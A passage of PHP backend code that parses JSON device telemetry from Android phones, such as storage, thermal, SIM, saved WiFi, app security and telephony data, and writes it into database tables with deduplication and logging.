                    'psc'              => $tower['psc'] ?? null,
                    'system_id'        => $tower['system_id'] ?? null,
                    'rssi'             => $tower['rssi'] ?? null,
                    'rsrp'             => $tower['rsrp'] ?? null,
                    'rsrq'             => $tower['rsrq'] ?? null,
                    'rssnr'            => $tower['rssnr'] ?? null,
                    'cqi'              => $tower['cqi'] ?? null,
                    'asu_level'        => $tower['asu_level'] ?? null,
                    'csi_rsrp'         => $tower['csi_rsrp'] ?? null,
                    'csi_rsrq'         => $tower['csi_rsrq'] ?? null,
                    'csi_sinr'         => $tower['csi_sinr'] ?? null,
                    'is_registered'    => isset($tower['is_registered']) ? ($tower['is_registered'] ? 1 : 0) : 0,
                    'network_operator' => $json['network_operator'] ?? null,
                    'network_operator_name' => $json['network_operator_name'] ?? null,
                    'phone_type'       => $json['phone_type'] ?? null,
                    'sim_state'        => $json['sim_state'] ?? null,
                    'extracted_at'     => $extracted_at,
                    'created_at'       => $dated,
                ]);
            }

            log_message('info', '[parse_cell_towers] Inserted ' . count($towers) . ' towers for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_cell_towers] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DisplayInfoExtractor → tbl_telemetry_display_info
     * File category: display_info
     * Stores display metrics, resolution, density, refresh rate
     */
    public function parse_display_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_display_info')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $displays = $json['displays'] ?? [];

            $this->db->table('tbl_telemetry_display_info')->insert([
                'owner_id'          => $owner_id,
                'device_id'         => $device_id,
                'width_px'          => $json['width_px'] ?? null,
                'height_px'         => $json['height_px'] ?? null,
                'real_width'        => $json['real_width'] ?? null,
                'real_height'       => $json['real_height'] ?? null,
                'usable_width'      => $json['usable_width'] ?? null,
                'usable_height'     => $json['usable_height'] ?? null,
                'density'           => $json['density'] ?? null,
                'density_dpi'       => $json['density_dpi'] ?? null,
                'xdpi'              => $json['xdpi'] ?? null,
                'ydpi'              => $json['ydpi'] ?? null,
                'scaled_density'    => $json['scaled_density'] ?? null,
                'rotation'          => $json['rotation'] ?? null,
                'refresh_rate'      => $json['refresh_rate'] ?? null,
                'mode_width'        => $json['mode_width'] ?? null,
                'mode_height'       => $json['mode_height'] ?? null,
                'mode_refresh_rate' => $json['mode_refresh_rate'] ?? null,
                'displays_json'     => !empty($displays) ? json_encode($displays) : null,
                'screen_layout'     => $json['screen_layout'] ?? null,
                'smallest_screen_width_dp' => $json['smallest_screen_width_dp'] ?? null,
                'ui_mode'           => $json['ui_mode'] ?? null,
                'extracted_at'      => $extracted_at,
                'created_at'        => $dated,
            ]);

            log_message('info', '[parse_display_info] Inserted display info for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_display_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * StorageExtractor → tbl_telemetry_storage_stats
     * File category: storage
     * Stores internal/external storage volumes
     */
    public function parse_storage(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $volumes      = $json['volumes'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_storage_stats')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($volumes as $vol) {
                $info = $vol['info'] ?? [];
                $this->db->table('tbl_telemetry_storage_stats')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => $vol['path'] ?? null,
                    'description'    => $vol['description'] ?? null,
                    'is_removable'   => isset($vol['is_removable']) ? ($vol['is_removable'] ? 1 : 0) : 0,
                    'state'          => $vol['state'] ?? null,
                    'total_bytes'    => $info['total_bytes'] ?? null,
                    'available_bytes'=> $info['available_bytes'] ?? null,
                    'free_bytes'     => $info['free_bytes'] ?? null,
                    'used_bytes'     => $info['used_bytes'] ?? null,
                    'total_formatted'=> $info['total_formatted'] ?? null,
                    'available_formatted' => $info['available_formatted'] ?? null,
                    'used_formatted' => $info['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            // App cache and data
            if (isset($json['app_cache'])) {
                $this->db->table('tbl_telemetry_storage_stats')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => 'app_cache',
                    'total_bytes'    => $json['app_cache']['total_bytes'] ?? null,
                    'available_bytes'=> $json['app_cache']['available_bytes'] ?? null,
                    'free_bytes'     => $json['app_cache']['free_bytes'] ?? null,
                    'used_bytes'     => $json['app_cache']['used_bytes'] ?? null,
                    'total_formatted'=> $json['app_cache']['total_formatted'] ?? null,
                    'available_formatted' => $json['app_cache']['available_formatted'] ?? null,
                    'used_formatted' => $json['app_cache']['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }
            if (isset($json['app_data'])) {
                $this->db->table('tbl_telemetry_storage_stats')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => 'app_data',
                    'total_bytes'    => $json['app_data']['total_bytes'] ?? null,
                    'available_bytes'=> $json['app_data']['available_bytes'] ?? null,
                    'free_bytes'     => $json['app_data']['free_bytes'] ?? null,
                    'used_bytes'     => $json['app_data']['used_bytes'] ?? null,
                    'total_formatted'=> $json['app_data']['total_formatted'] ?? null,
                    'available_formatted' => $json['app_data']['available_formatted'] ?? null,
                    'used_formatted' => $json['app_data']['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            log_message('info', '[parse_storage] Inserted ' . count($volumes) . ' volumes for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_storage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ThermalExtractor → tbl_telemetry_thermal
     * File category: thermal
     * Stores thermal zones, CPU throttle, CPU frequencies
     */
    public function parse_thermal(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $zones        = $json['thermal_zones'] ?? [];
            $cpu_throttle = $json['cpu_throttle'] ?? [];
            $cpu_freqs    = $json['cpu_frequencies'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_thermal')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($zones as $zone) {
                $this->db->table('tbl_telemetry_thermal')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'zone_name'    => $zone['zone'] ?? null,
                    'zone_type'    => $zone['type'] ?? null,
                    'temp_raw'     => $zone['temp_raw'] ?? null,
                    'temp_celsius' => $zone['temp_celsius'] ?? null,
                    'policy'       => $zone['policy'] ?? null,
                    'data_type'    => 'thermal_zone',
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            foreach ($cpu_throttle as $throttle) {
                $this->db->table('tbl_telemetry_thermal')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'cpu_name'     => $throttle['cpu'] ?? null,
                    'core_limit_max' => $throttle['core_limit_max'] ?? null,
                    'package_limit_max' => $throttle['package_limit_max'] ?? null,
                    'throttle_count'   => $throttle['throttle_count'] ?? null,
                    'data_type'    => 'cpu_throttle',
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            foreach ($cpu_freqs as $freq) {
                $this->db->table('tbl_telemetry_thermal')->insert([
                    'owner_id'         => $owner_id,
                    'device_id'        => $device_id,
                    'cpu_name'         => $freq['cpu'] ?? null,
                    'scaling_min_freq' => $freq['scaling_min_freq'] ?? null,
                    'scaling_max_freq' => $freq['scaling_max_freq'] ?? null,
                    'scaling_cur_freq' => $freq['scaling_cur_freq'] ?? null,
                    'scaling_governor' => $freq['scaling_governor'] ?? null,
                    'data_type'        => 'cpu_frequency',
                    'extracted_at'     => $extracted_at,
                    'created_at'       => $dated,
                ]);
            }

            log_message('info', '[parse_thermal] Inserted thermal data for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_thermal] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * NfcExtractor → tbl_telemetry_nfc
     * File category: nfc
     * Stores NFC adapter state and features
     */
    public function parse_nfc(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_nfc')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_telemetry_nfc')->insert([
                'owner_id'           => $owner_id,
                'device_id'          => $device_id,
                'nfc_available'      => isset($json['nfc_available']) ? ($json['nfc_available'] ? 1 : 0) : 0,
                'nfc_supported'      => isset($json['nfc_supported']) ? ($json['nfc_supported'] ? 1 : 0) : 0,
                'nfc_enabled'        => isset($json['nfc_enabled']) ? ($json['nfc_enabled'] ? 1 : 0) : 0,
                'nfc_secure_nfc'     => isset($json['nfc_secure_nfc']) ? ($json['nfc_secure_nfc'] ? 1 : 0) : 0,
                'nfc_secure_supported' => isset($json['nfc_secure_nfc_supported']) ? ($json['nfc_secure_nfc_supported'] ? 1 : 0) : 0,
                'features_json'      => isset($json['nfc_features']) ? json_encode($json['nfc_features']) : null,
                'extracted_at'       => $extracted_at,
                'created_at'         => $dated,
            ]);

            log_message('info', '[parse_nfc] Inserted NFC info for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_nfc] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DataUsageExtractor → tbl_data_usage
     * File category: data_usage
     * Stores per-network mobile/WiFi data usage
     */
    public function parse_data_usage(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $records      = $json['usage_records'] ?? [];
            $totals       = $json['totals'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_data_usage')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($records as $rec) {
                $this->db->table('tbl_data_usage')->insert([
                    'owner_id'      => $owner_id,
                    'device_id'     => $device_id,
                    'network_type'  => $rec['network_type'] ?? null,
                    'level'         => $rec['level'] ?? null,
                    'uid'           => $rec['uid'] ?? null,
                    'package_name'  => $rec['package_name'] ?? null,
                    'sub_id'        => $rec['sub_id'] ?? null,
                    'is_wifi'       => isset($rec['is_wifi']) ? ($rec['is_wifi'] ? 1 : 0) : 0,
                    'rx_bytes'      => $rec['rx_bytes'] ?? null,
                    'tx_bytes'      => $rec['tx_bytes'] ?? null,
                    'total_bytes'   => $rec['total_bytes'] ?? null,
                    'rx_formatted'  => $rec['rx_formatted'] ?? null,
                    'tx_formatted'  => $rec['tx_formatted'] ?? null,
                    'bucket_start'  => $rec['bucket_start'] ?? null,
                    'bucket_end'    => $rec['bucket_end'] ?? null,
                    'extracted_at'  => $extracted_at,
                    'created_at'    => $dated,
                ]);
            }

            // Store totals
            if (!empty($totals)) {
                $this->db->table('tbl_data_usage')->insert([
                    'owner_id'      => $owner_id,
                    'device_id'     => $device_id,
                    'network_type'  => 'total',
                    'level'         => 'totals',
                    'is_wifi'       => 0,
                    'rx_bytes'      => $totals['total_rx'] ?? null,
                    'tx_bytes'      => $totals['total_tx'] ?? null,
                    'total_bytes'   => ($totals['total_rx'] ?? 0) + ($totals['total_tx'] ?? 0),
                    'rx_formatted'  => $totals['total_rx_formatted'] ?? null,
                    'tx_formatted'  => $totals['total_tx_formatted'] ?? null,
                    'wifi_rx'       => $totals['wifi_rx'] ?? null,
                    'wifi_tx'       => $totals['wifi_tx'] ?? null,
                    'mobile_rx'     => $totals['mobile_rx'] ?? null,
                    'mobile_tx'     => $totals['mobile_tx'] ?? null,
                    'extracted_at'  => $extracted_at,
                    'created_at'    => $dated,
                ]);
            }

            log_message('info', '[parse_data_usage] Inserted ' . count($records) . ' usage records for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_data_usage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * SavedWifiExtractor → tbl_telemetry_wifi_networks
     * File category: saved_wifi
     * Stores configured/saved WiFi networks
     */
    public function parse_saved_wifi(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $networks     = $json['saved_networks'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_wifi_networks')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($networks as $net) {
                $this->db->table('tbl_telemetry_wifi_networks')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'ssid'           => $net['ssid'] ?? null,
                    'bssid'          => $net['bssid'] ?? null,
                    'network_id'     => $net['network_id'] ?? null,
                    'priority'       => $net['priority'] ?? null,
                    'status'         => $net['status'] ?? null,
                    'is_hidden'      => isset($net['is_hidden']) ? ($net['is_hidden'] ? 1 : 0) : 0,
                    'security'       => $net['security'] ?? null,
                    'protocols_json' => isset($net['protocols']) ? json_encode($net['protocols']) : null,
                    'auth_algorithms_json' => isset($net['auth_algorithms']) ? json_encode($net['auth_algorithms']) : null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            log_message('info', '[parse_saved_wifi] Inserted ' . count($networks) . ' saved WiFi networks for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_saved_wifi] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * SimConfigExtractor → tbl_sim_configs
     * File category: sim_configs (via misc_software composite)
     * Stores per-slot SIM configuration details.
     */
    public function parse_sim_configs(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $entries = $json['sim_configs'] ?? $json['sim_config'] ?? [];
            if (isset($entries['sim_serial']) || isset($entries['subscriber_id'])) {
                $entries = [$entries];
            }
            if (!is_array($entries)) return false;

            foreach ($entries as $entry) {
                if (!is_array($entry)) continue;

                $this->db->table('tbl_sim_configs')->insert([
                    'owner_id'          => $owner_id,
                    'device_id'         => $device_id,
                    'sim_serial'        => $entry['sim_serial'] ?? null,
                    'subscriber_id'     => $entry['subscriber_id'] ?? null,
                    'sim_operator_name' => $entry['sim_operator_name'] ?? $entry['operator_name'] ?? null,
                    'sim_country_iso'   => $entry['sim_country_iso'] ?? $entry['country_iso'] ?? null,
                    'sim_state'         => $entry['sim_state'] ?? $entry['state'] ?? null,
                    'phone_type'        => $entry['phone_type'] ?? $entry['phoneType'] ?? null,
                    'is_sim_changed'    => !empty($entry['is_sim_changed']) ? 1 : 0,
                    'captured_at'       => $entry['captured_at'] ?? $entry['timestamp'] ?? $extracted_at,
                    'extracted_at'      => $extracted_at,
                    'created_at'        => $dated,
                    'updated_at'        => $dated,
                ]);
            }

            log_message('info', '[parse_sim_configs] Processed SIM configs for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_sim_configs] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DefaultAppsExtractor → tbl_system_default_apps_device
     * File category: default_apps
     * Stores default browser, dialer, SMS, launcher, etc.
     */
    public function parse_default_apps(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_system_default_apps_device')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $handlerFields = [
                'default_browser' => 'browser',
                'default_dialer'  => 'dialer',
                'default_sms'     => 'sms',
                'default_launcher'=> 'launcher',
                'default_email'   => 'email',
                'default_maps'    => 'maps',
                'default_music'   => 'music',
                'default_gallery' => 'gallery',
                'default_browser_app' => 'browser_app',
            ];

            foreach ($handlerFields as $jsonKey => $handlerType) {
                $app = $json[$jsonKey] ?? [];
                if (!empty($app) && is_array($app) && isset($app['package_name'])) {
                    $this->db->table('tbl_system_default_apps_device')->insert([
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'handler_type' => $handlerType,
                        'package_name' => $app['package_name'] ?? null,
                        'app_name'     => $app['app_name'] ?? null,
                        'is_system'    => isset($app['is_system']) ? ($app['is_system'] ? 1 : 0) : 0,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                    ]);
                }
            }

            if (isset($json['default_sms_package'])) {
                $this->db->table('tbl_system_default_apps_device')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'handler_type' => 'sms_package',
                    'package_name' => $json['default_sms_package'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            log_message('info', '[parse_default_apps] Inserted default apps for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_default_apps] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AlarmsExtractor → tbl_system_alarms
     * File category: alarms
     * Stores JobScheduler jobs and AlarmManager alarms
     */
    public function parse_alarms(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $jobs         = $json['scheduled_jobs'] ?? [];
            $alarms       = $json['alarm_clocks'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_system_alarms')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($jobs as $job) {
                $this->db->table('tbl_system_alarms')->insert([
                    'owner_id'           => $owner_id,
                    'device_id'          => $device_id,
                    'alarm_type'         => 'job',
                    'job_id'             => $job['job_id'] ?? null,
                    'service_class'      => $job['service'] ?? null,
                    'package_name'       => $job['package'] ?? null,
                    'is_periodic'        => isset($job['is_periodic']) ? ($job['is_periodic'] ? 1 : 0) : 0,
                    'interval_millis'    => $job['interval_millis'] ?? null,
                    'min_flex_millis'    => $job['min_flex_millis'] ?? null,
                    'requires_charging'  => isset($job['requires_charging']) ? ($job['requires_charging'] ? 1 : 0) : 0,
                    'requires_idle'      => isset($job['requires_idle']) ? ($job['requires_idle'] ? 1 : 0) : 0,
                    'network_type'       => $job['network_type'] ?? null,
                    'persisted'          => isset($job['persisted']) ? ($job['persisted'] ? 1 : 0) : 0,
                    'initial_delay_millis' => $job['initial_delay_millis'] ?? null,
                    'minimum_latency_millis' => $job['minimum_latency_millis'] ?? null,
                    'important_foreground' => isset($job['important_while_foreground']) ? ($job['important_while_foreground'] ? 1 : 0) : 0,
                    'extracted_at'       => $extracted_at,
                    'created_at'         => $dated,
                ]);
            }

            foreach ($alarms as $alarm) {
                $this->db->table('tbl_system_alarms')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'alarm_type'   => 'alarm_clock',
                    'trigger_time' => $alarm['trigger_time_millis'] ?? null,
                    'trigger_time_formatted' => $alarm['trigger_time_formatted'] ?? null,
                    'package_name' => $alarm['package'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . count($alarms) . ' alarms for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_alarms] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * HardwareGraphicsExtractor → tbl_hardware_graphics
     * File category: hardware_graphics / hardwaregraphics
     * Stores GPU/Renderer info, Media Codecs, and Input Devices.
     */
    public function parse_hardware_graphics(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            // Encode JSON fields
            $gpu_renderer = $json['gpu_renderer'] ?? null;
            if (is_array($gpu_renderer)) $gpu_renderer = json_encode($gpu_renderer);

            $media_codecs = $json['media_codecs'] ?? null;
            if (is_array($media_codecs)) $media_codecs = json_encode($media_codecs);

            $input_devices = $json['input_devices'] ?? null;
            if (is_array($input_devices)) $input_devices = json_encode($input_devices);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'gpu_renderer_json' => $gpu_renderer,
                'media_codecs_json' => $media_codecs,
                'input_devices_json' => $input_devices,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $this->db->table('tbl_hardware_graphics')->insert($data);
            log_message('info', '[parse_hardware_graphics] Inserted hardware graphics snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_hardware_graphics] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_hardware_network(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            $network_interfaces = $json['network_interfaces'] ?? null;
            if (is_array($network_interfaces)) $network_interfaces = json_encode($network_interfaces);

            $proc_net_dev = $json['proc_net_dev'] ?? null;
            if (is_array($proc_net_dev)) $proc_net_dev = json_encode($proc_net_dev);

            $link_properties = $json['link_properties'] ?? null;
            if (is_array($link_properties)) $link_properties = json_encode($link_properties);

            $arp_cache = $json['arp_cache'] ?? null;
            if (is_array($arp_cache)) $arp_cache = json_encode($arp_cache);

            $wifi_passpoint = $json['wifi_passpoint'] ?? null;
            if (is_array($wifi_passpoint)) $wifi_passpoint = json_encode($wifi_passpoint);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'network_interfaces_json' => $network_interfaces,
                'proc_net_dev_json' => $proc_net_dev,
                'link_properties_json' => $link_properties,
                'arp_cache_json' => $arp_cache,
                'wifi_passpoint_json' => $wifi_passpoint,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_hardware_network')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_hardware_network')->insert($data);
            log_message('info', '[parse_hardware_network] Inserted hardware network snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_hardware_network] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_app_security(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            $device_admin_apps = $json['device_admin_apps'] ?? null;
            if (is_array($device_admin_apps)) $device_admin_apps = json_encode($device_admin_apps);

            $app_permissions_map = $json['app_permissions_map'] ?? null;
            if (is_array($app_permissions_map)) $app_permissions_map = json_encode($app_permissions_map);

            $running_services = $json['running_services'] ?? null;
            if (is_array($running_services)) $running_services = json_encode($running_services);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'device_admin_apps_json' => $device_admin_apps,
                'app_permissions_map_json' => $app_permissions_map,
                'running_services_json' => $running_services,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_system_app_security')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_system_app_security')->insert($data);
            log_message('info', '[parse_app_security] Inserted app security snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_app_security] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_network_security(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            $dns_config = $json['dns_config'] ?? null;
            if (is_array($dns_config)) $dns_config = json_encode($dns_config);

            $vpn_config = $json['vpn_config'] ?? null;
            if (is_array($vpn_config)) $vpn_config = json_encode($vpn_config);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'dns_config_json' => $dns_config,
                'vpn_config_json' => $vpn_config,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_network_security')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_network_security')->insert($data);
            log_message('info', '[parse_network_security] Inserted network security snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_network_security] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_telephony_network(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            $ims_volte = $json['ims_volte'] ?? null;
            $imsArr    = is_array($ims_volte) ? $ims_volte : [];
            if (is_array($ims_volte)) $ims_volte = json_encode($ims_volte);

            $data_roaming = $json['data_roaming'] ?? null;
            if (is_array($data_roaming)) $data_roaming = json_encode($data_roaming);

            $data = [
                'owner_id'               => $owner_id,
                'device_id'              => $device_id,
                'ims_volte_json'         => $ims_volte,
                'data_roaming_json'      => $data_roaming,
                'ims_registration_state' => $imsArr['ims_registration_state'] ?? null,
                'ims_registration_tech'  => $imsArr['ims_registration_tech'] ?? null,
                'volte_provisioned'      => isset($imsArr['volte_provisioned']) ? ($imsArr['volte_provisioned'] ? 1 : 0) : null,
                'vowifi_provisioned'     => isset($imsArr['vowifi_provisioned']) ? ($imsArr['vowifi_provisioned'] ? 1 : 0) : null,
                'vowifi_enabled'         => isset($imsArr['vowifi_enabled']) ? ($imsArr['vowifi_enabled'] ? 1 : 0) : null,
                'rtcsupported'           => isset($imsArr['rtcsupported']) ? ($imsArr['rtcsupported'] ? 1 : 0) : null,
                'utsupported'            => isset($imsArr['utsupported']) ? ($imsArr['utsupported'] ? 1 : 0) : null,
                'mmttel_supported'       => isset($imsArr['mmttel_supported']) ? ($imsArr['mmttel_supported'] ? 1 : 0) : null,
                'wfc_mode_pref'          => $imsArr['wfc_mode_pref'] ?? null,
                'wfc_roaming_mode_pref'  => $imsArr['wfc_roaming_mode_pref'] ?? null,
                'volte_roaming_enabled'  => isset($imsArr['volte_roaming_enabled']) ? ($imsArr['volte_roaming_enabled'] ? 1 : 0) : null,
                'video_call_enabled'     => isset($imsArr['video_call_enabled']) ? ($imsArr['video_call_enabled'] ? 1 : 0) : null,
                'vt_quality'             => $imsArr['vt_quality'] ?? null,
                'ims_capabilities'       => json_encode($imsArr['ims_capabilities'] ?? []),
                'provisioned_ims_apns'   => json_encode($imsArr['provisioned_ims_apns'] ?? []),
                'emergency_numbers'      => json_encode($imsArr['emergency_numbers'] ?? []),
                'emergency_categories'   => json_encode($imsArr['emergency_categories'] ?? []),
                'mwi_status'             => $imsArr['mwi_status'] ?? null,
                'voice_message_count'    => $imsArr['voice_message_count'] ?? null,
                'call_forwarding_status' => $imsArr['call_forwarding_status'] ?? null,
                'call_waiting_enabled'   => isset($imsArr['call_waiting_enabled']) ? ($imsArr['call_waiting_enabled'] ? 1 : 0) : null,
                'clip_enabled'           => isset($imsArr['clip_enabled']) ? ($imsArr['clip_enabled'] ? 1 : 0) : null,
